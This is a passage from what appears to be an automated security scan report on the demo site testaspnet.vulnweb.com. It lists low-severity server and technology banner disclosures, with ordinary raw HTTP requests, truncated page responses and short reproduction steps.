  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 22818
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:27:42 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>ReadNews</title>\x0d
    		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">\x0d
    		<meta content="C#" name="CODE_LANGUAGE">\x0d
    		<meta content="JavaScript" name="vs_defaultClientScript">\x0d
    		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [5 more lines, 4048 chars total]
  elapsed_ms: 705.7
  --- RAW REQUEST req-b3ec5432 (exactly as issued by the engine) ---
  POST /ReadNews.aspx?id=0&NewsAd=ads%2Fdef.html
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTM1MjIzMjU2OQ9kFgICAQ9kFgwCAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkAgMPFgIfAQVJcG9zdGVkIGJ5IDxzdHJvbmc%2BYWRtaW4gICAgICAgICAgICAgICAgICAgIDwvc3Ryb25nPjUvMTYvMjAxOSAxMjozMjozMCBQTWQCBQ8WAh8BBT5BY3VuZXRpeCBWdWxuZXJhYmlsaXR5IFNjYW5uZXIgTm93IFdpdGggTmV0d29yayBTZWN1cml0eSBTY2Fuc2QCBw8WAh8BBbMePHA%2BPHN0cm9uZz5Mb25kb24sIFVLPC9zdHJvbmc%2BICZuZGFzaDsgPHN0cm9uZz5NYXkgMjAxOTwvc3Ryb25nPiAmbmRhc2g7IEFjdW5ldGl4LCB0aGUgcGlvbmVlciBpbiBhdXRvbWF0ZWQgd2ViIGFwcGxpY2F0aW9uIHNlY3VyaXR5IHNvZnR3YXJlLCBoYXMgYW5ub3VuY2VkIHRoYXQgYWxsIHZlcnNpb25zIG9mIHRoZSA8YSBocmVmPWh0dHBzOi8vd3d3LmFjdW5ldGl4LmNvbS92dWxuZXJhYmlsaXR5LXNjYW5uZXIvPkFjdW5ldGl4IFZ1bG5lcmFiaWxpdHkgU2Nhbm5lcjwvYT4gbm93IHN1cHBvcnQgPGEgaHJlZj1odHRwczovL3d3dy5hY3VuZXRpeC5jb20vdnVsbmVyYWJpbGl0eS1zY2FubmVyL25ldHdvcmstc2VjdXJpdHktc2Nhbm5lci8%2BbmV0d29yayBzZWN1cml0eSBzY2FubmluZzwvYT4uIE5ldHdvcmsgc2VjdXJpdHkgc2NhbnMgYXJlIHBvc3NpYmxlIHRoYW5rcyB0byB0aGUgc2VhbWxlc3MgaW50ZWdyYXRpb24gb2YgQWN1bmV0aXggd2l0aCB0aGUgcG93ZXJmdWwgT3BlblZBUyBzZWN1cml0eSBzb2x1dGlvbi4gVW50aWwgbm93LCBuZXR3b3JrIHNlY3VyaXR5IHNjYW5uaW5nIGZ1bmN0aW9uYWxpdHkgd2FzIGF2YWlsYWJsZSBvbmx5IGluIEFjdW5ldGl4IE9ubGluZS48L3A%2BICAgICA8cD4mbGRxdW87Tm8gbWF0dGVyIHRoZSBzaXplIG9mIHlvdXIgYnVzaW5lc3MsIHlvdSB1c2UgbXVsdGlwbGUgc2VjdXJpdHkgbWVhc3VyZXMgdG8gYWxsZXZpYXRlIGRpZmZlcmVudCB0eXBlcyBvZiByaXNrcy4gWW91ciBzZWN1cml0eSBzdHJhdGVneSBtdXN0IGFsd2F5cyBpbmNsdWRlIGJvdGggd2ViIHNlY3VyaXR5IHNjYW5zIGFuZCBuZXR3b3JrIHNlY3VyaXR5IHNjYW5zLiBBbmQgaXQgbWFrZXMgaXQgc28gbXVjaCBlYXNpZXIgYW5kIG11Y2ggbW9yZSBlZmZpY2llbnQgaWYgeW91IGNhbiBkbyB0aGUgdHdvIHRvZ2V0aGVyIHVzaW5nIGEgc2luZ2xlIGludGVncmF0ZWQgdG9vbCwmcmRxdW87IHNhaWQgTmljb2xhcyBTY2liZXJyYXMsIENUTy48L3A%2BICAgICA8cD5UaGVyZSBhcmUgbWFueSBhZHZhbnRhZ2VzIG9mIHJ1bm5pbmcgbmV0d29yayBzZWN1cml0eSBzY2FucyBpbiBBY3VuZXRpeC4gSGF2aW5nIGEgc2luZ2xlIGludGVncmF0ZWQgZGFzaGJvYXJkIHdpdGggYm90aCB3ZWIgYW5kIG5ldHdvcmsgdnVsbmVyYWJpbGl0aWVzIGdpdmVzIHRoZSBiZXN0IHBvc3NpYmxlIHJpc2sgdmlzaWJpbGl0eSBhbmQgc2F2ZXMgYSBsb3Qgb2YgdGltZSBhbmQgZWZmb3J0LiBOZXR3b3JrIHNjYW5zIG1heSBhbHNvIGJlbmVmaXQgZnJvbSBvdGhlciBBY3VuZXRpeCBmZWF0dXJlcywgc3VjaCBhcyA8YSBocmVmPWh0dHBzOi8vd3d3LmFjdW5ldGl4LmNvbS92dWxuZXJhYmlsaXR5LXNjYW5uZXIvYWN1bmV0aXgtaW50ZWdyYXRpb25zLz5pc3N1ZSB0cmFja2VyIGludGVncmF0aW9uPC9hPiBhbmQgPGEgaHJlZj1odHRwczovL3d3dy5hY3VuZXRpeC5jb20vdnVsbmVyYWJpbGl0eS1zY2FubmVyL3Z1bG5lcmFiaWxpdHktbWFuYWdlbWVudC1yZWd1bGF0b3J5LWNvbXBsaWFuY2UvPmNvbXByZWhlbnNpdmUgcmVwb3J0aW5nPC9hPi48L3A%2BICAgICA8cD48c3Ryb25nPk1vcmUgRmVhdHVyZXMgaW4gdGhlIExhdGVzdCBCdWlsZDwvc3Ryb25nPjwvcD4gICAgIDxwPk9wZW5WQVMgaW50ZWdyYXRpb24gaXMgaW50cm9kdWNlZCBhcyBwYXJ0IG9mIHRoZSBsYXRlc3QgQWN1bmV0aXggdmVyc2lvbiAxMiBidWlsZCAoPGEgaHJlZj1odHRwczovL3d3dy5hY3VuZXRpeC5jb20vYmxvZy9yZWxlYXNlcy9uZXctYnVpbGQtbmV0d29yay1zY2FubmluZy1pbnRlZ3JhdGlvbi1pcHY2LXN1cHBvcnQvPmJ1aWxkIDEyLjAuMTkwNTE1MTQ5PC9hPikuIFRoaXMgbmV3IGJ1aWxkIGFsc28gaW5jbHVkZXM6PC9wPiAgICAgPHA%2BLSBTdXBwb3J0IGZvciBJUHY2PGJyIC8%2BICAgICAtIEltcHJvdmVkIHVzYWdlIG9mIG1hY2hpbmUgcmVzb3VyY2VzPGJyIC8%2BICAgICAtIEFkZGVkIHN1cHBvcnQgZm9yIFNlbGVuaXVtIHNjcmlwdHMgYXMgaW1wb3J0IGZpbGVzPGJyIC8%2BICAgICAtIE11bHRpcGxlIHZ1bG5lcmFiaWxpdHkgY2hlY2tzIGZvciBTQVA8YnIgLz4gICAgIC0gVW5hdXRob3JpemVkIGFjY2VzcyBkZXRlY3Rpb24gZm9yIFJlZGlzIGFuZCBNZW1jYWNoZWQ8YnIgLz4gICAgIC0gU291cmNlIGNvZGUgZGlzY2xvc3VyZSBmb3IgUnVieSBhbmQgUHl0aG9uPC9wPiAgICAgPHA%2BVGhlIG5ldyBidWlsZCBhbHNvIGluY2x1ZGVzIGEgbnVtYmVyIG9mIHVwZGF0ZXMgYW5kIGZpeGVzLCBhbGwgb2Ygd2hpY2ggYXJlIGF2YWlsYWJsZSBmb3IgYm90aCBXaW5kb3dzIGFuZCBMaW51eC4gTW9yZSBpbmZvcm1hdGlvbiBjYW4gYmUgZm91bmQgPGEgaHJlZj1odHRwczovL3d3dy5hY3VuZXRpeC5jb20vYmxvZy9yZWxlYXNlcy9uZXctYnVpbGQtbmV0d29yay1zY2FubmluZy1pbnRlZ3JhdGlvbi1pcHY2LXN1cHBvcnQvPmhlcmU8L2E%2BLjwvcD4gICAgIDxwPkdldCBhIGRlbW8gb2YgdGhlIHByb2R1Y3QgPGEgaHJlZj1odHRwczovL3d3dy5hY3VuZXRpeC5jb20vbmV0d29yay1zZWN1cml0eS1zY2FubmVyLz5oZXJlPC9hPi48L3A%2BICAgICA8cD48c3Ryb25nPkFib3V0IEFjdW5ldGl4PC9zdHJvbmc%2BPC9wPiAgICAgPHA%2BVXNlci1mcmllbmRseSBhbmQgY29tcGV0aXRpdmVseSBwcmljZWQsIEFjdW5ldGl4IGxlYWRzIHRoZSBtYXJrZXQgaW4gYXV0b21hdGljIHdlYiBzZWN1cm
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 22915
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:28:53 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>ReadNews</title>\x0d
    		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">\x0d
    		<meta content="C#" name="CODE_LANGUAGE">\x0d
    		<meta content="JavaScript" name="vs_defaultClientScript">\x0d
    		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [5 more lines, 4048 chars total]
  elapsed_ms: 685.4
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com/ReadNews.aspx as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTASPNET F12] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Microsoft-IIS/8.5
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-632fe5b3 (exactly as issued by the engine) ---
  GET 
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 14045
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:22:55 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>acublog news</title>\x0d
    		<META http-equiv="Content-Type" content="text/html; charset=windows-1252">\x0d
    		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">\x0d
    		<meta content="C#" name="CODE_LANGUAGE">\x0d
    		<meta content="JavaScript" name="vs_defaultClientScript">\x0d
    		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    ... [55 more lines, 4198 chars total]
  elapsed_ms: 513.6
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASPNET F13] tech_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Technology stack disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] X-Powered-By: ASP.NET
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-632fe5b3 (exactly as issued by the engine) ---
  GET 
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 14045
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:22:55 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>acublog news</title>\x0d
    		<META http-equiv="Content-Type" content="text/html; charset=windows-1252">\x0d
    		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">\x0d
    		<meta content="C#" name="CODE_LANGUAGE">\x0d
    		<meta content="JavaScript" name="vs_defaultClientScript">\x0d
    		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    ... [55 more lines, 4198 chars total]
  elapsed_ms: 513.6
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASPNET F14] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com/styles.css (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Microsoft-IIS/8.5
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-0d12c219 (exactly as issued by the engine) ---
  GET /styles.css
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    accept-ranges: bytes
    content-length: 2597
    content-type: text/css
    date: Sat, 03 Oct 2026 01:22:57 GMT
    etag: "c8c2136e99c1c81:0"
    last-modified: Thu, 29 May 2008 14:36:50 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    body\x0d
    {\x0d
    	padding-right: 0px;\x0d
    	padding-left: 0px;\x0d
    	list-style-position: outside;\x0d
    	background: url(images/background.gif) #e6dccf fixed repeat-y center top;\x0d
    	padding-bottom: 0px;\x0d
    	margin: 0px;\x0d
    	font: small tahoma, "Bitstream Vera Sans" , "Trebuchet MS" , "Lucida Grande" , lucida, helvetica, sans-serif;\x0d
    	padding-top: 0px;\x0d
    	list-style-type: square;\x0d
    }\x0d
    ... [142 more lines, 3056 chars total]
  elapsed_ms: 320.0
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com/styles.css as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASPNET F15] tech_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com/styles.css (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Technology stack disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] X-Powered-By: ASP.NET
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-0d12c219 (exactly as issued by the engine) ---
  GET /styles.css
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    accept-ranges: bytes
    content-length: 2597
    content-type: text/css
    date: Sat, 03 Oct 2026 01:22:57 GMT
    etag: "c8c2136e99c1c81:0"
    last-modified: Thu, 29 May 2008 14:36:50 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    body\x0d
    {\x0d
    	padding-right: 0px;\x0d
    	padding-left: 0px;\x0d
    	list-style-position: outside;\x0d
    	background: url(images/background.gif) #e6dccf fixed repeat-y center top;\x0d
    	padding-bottom: 0px;\x0d
    	margin: 0px;\x0d
    	font: small tahoma, "Bitstream Vera Sans" , "Trebuchet MS" , "Lucida Grande" , lucida, helvetica, sans-serif;\x0d
    	padding-top: 0px;\x0d
    	list-style-type: square;\x0d
    }\x0d
    ... [142 more lines, 3056 chars total]
  elapsed_ms: 320.0
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com/styles.css as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASPNET F16] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com/about.aspx (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Microsoft-IIS/8.5
    * [header_value] Server: Microsoft-IIS/8.5
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-782955ec (exactly as issued by the engine) ---
  GET /about.aspx
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 14598
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:22:57 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>About</title>\x0d
    		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">\x0d
    		<meta name="CODE_LANGUAGE" Content="C#">\x0d
    		<meta name="vs_defaultClientScript" content="JavaScript">\x0d
    		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [55 more lines, 4198 chars total]
  elapsed_ms: 500.6
  --- RAW REQUEST req-84f1e7a6 (exactly as issued by the engine) ---
  POST /about.aspx
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTEwNTI0MjkwNQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkZLDaiLtIJBFGHdHW8BBidJDZ856t&__VIEWSTATEGENERATOR=E809BCA5&__EVENTVALIDATION=%2FwEWVwKqq9H0CQLi%2B%2BjXCAKUlvjlDgK20sH6DwK20sH6DwK20vWRBwK20vWRBwK20qn5BQK20qn5BQK20t2dDQK20t2dDQKL%2Ba8FAov5rwUCi%2FnD2QkCi%2FnD2QkCi%2Fn3%2FAICi%2Fn3%2FAICi%2FnrkwoCi%2FnrkwoCi%2FmftgMCi%2FmftgMCi%2FmzzQwCi%2FmzzQwCi%2Fmn4AUCi%2Fmn4AUCi%2FnbhA0Ci%2FnbhA0Ci%2FmP7AsCi%2FmP7AsCi%2FmjgwMCi%2FmjgwMCvJPvxAkCvJPvxAkCvJODmwECvJODmwECvJO3vgoCvJO3vgoCvJOr1QMCvJOr1QMCvJPf6QwCvJPf6QwCvJPzjAQCvJPzjAQCvJPnow0CvJPnow0CvJObxgYCvJObxgYCvJPPrwMCvJPPrwMCvJPjwgwCvJPjwgwCkbrN6w8CkbrN6w8CkbrhjgcCkbrhjgcCkbqVJQKRupUlApG6ifgJApG6ifgJApG6vZ8BApG6vZ8BApG60bMKApG60bMKApG6xdYDApG6xdYDApG6%2Be0MApG6%2Be0MApG6rdUJApG6rdUJApG6wekCApG6wekCAtTZwJ4HAtTZwJ4HAtTZ9DUC1Nn0NQLU2ejICQLU2ejICQLU2ZzvAgLU2ZzvAgLU2bCCCgLU2bCCCgLU2aTZAwLU2aTZAwLU2dj9DALU2dj9DALU2cyQBALU2cyQBOD%2BngBvTAKQTfFkI343BDtC1BPe
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 14598
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:24:31 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>About</title>\x0d
    		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">\x0d
    		<meta name="CODE_LANGUAGE" Content="C#">\x0d
    		<meta name="vs_defaultClientScript" content="JavaScript">\x0d
    		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [55 more lines, 4198 chars total]
  elapsed_ms: 491.2
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com/about.aspx as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASPNET F17] tech_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com/about.aspx (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Technology stack disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] X-Powered-By: ASP.NET
    * [header_value] X-Powered-By: ASP.NET
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-782955ec (exactly as issued by the engine) ---
  GET /about.aspx
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 14598
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:22:57 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>About</title>\x0d
    		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">\x0d
    		<meta name="CODE_LANGUAGE" Content="C#">\x0d
    		<meta name="vs_defaultClientScript" content="JavaScript">\x0d
    		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [55 more lines, 4198 chars total]
  elapsed_ms: 500.6
  --- RAW REQUEST req-84f1e7a6 (exactly as issued by the engine) ---
  POST /about.aspx
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTEwNTI0MjkwNQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkZLDaiLtIJBFGHdHW8BBidJDZ856t&__VIEWSTATEGENERATOR=E809BCA5&__EVENTVALIDATION=%2FwEWVwKqq9H0CQLi%2B%2BjXCAKUlvjlDgK20sH6DwK20sH6DwK20vWRBwK20vWRBwK20qn5BQK20qn5BQK20t2dDQK20t2dDQKL%2Ba8FAov5rwUCi%2FnD2QkCi%2FnD2QkCi%2Fn3%2FAICi%2Fn3%2FAICi%2FnrkwoCi%2FnrkwoCi%2FmftgMCi%2FmftgMCi%2FmzzQwCi%2FmzzQwCi%2Fmn4AUCi%2Fmn4AUCi%2FnbhA0Ci%2FnbhA0Ci%2FmP7AsCi%2FmP7AsCi%2FmjgwMCi%2FmjgwMCvJPvxAkCvJPvxAkCvJODmwECvJODmwECvJO3vgoCvJO3vgoCvJOr1QMCvJOr1QMCvJPf6QwCvJPf6QwCvJPzjAQCvJPzjAQCvJPnow0CvJPnow0CvJObxgYCvJObxgYCvJPPrwMCvJPPrwMCvJPjwgwCvJPjwgwCkbrN6w8CkbrN6w8CkbrhjgcCkbrhjgcCkbqVJQKRupUlApG6ifgJApG6ifgJApG6vZ8BApG6vZ8BApG60bMKApG60bMKApG6xdYDApG6xdYDApG6%2Be0MApG6%2Be0MApG6rdUJApG6rdUJApG6wekCApG6wekCAtTZwJ4HAtTZwJ4HAtTZ9DUC1Nn0NQLU2ejICQLU2ejICQLU2ZzvAgLU2ZzvAgLU2bCCCgLU2bCCCgLU2aTZAwLU2aTZAwLU2dj9DALU2dj9DALU2cyQBALU2cyQBOD%2BngBvTAKQTfFkI343BDtC1BPe
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 14598
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:24:31 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>About</title>\x0d
    		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">\x0d
    		<meta name="CODE_LANGUAGE" Content="C#">\x0d
    		<meta name="vs_defaultClientScript" content="JavaScript">\x0d
    		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [55 more lines, 4198 chars total]
  elapsed_ms: 491.2
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com/about.aspx as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASPNET F18] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com/default.aspx (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Microsoft-IIS/8.5
    * [header_value] Server: Microsoft-IIS/8.5
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-f4358432 (exactly as issued by the engine) ---
  GET /default.aspx
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 14045
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:22:58 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>acublog news</title>\x0d
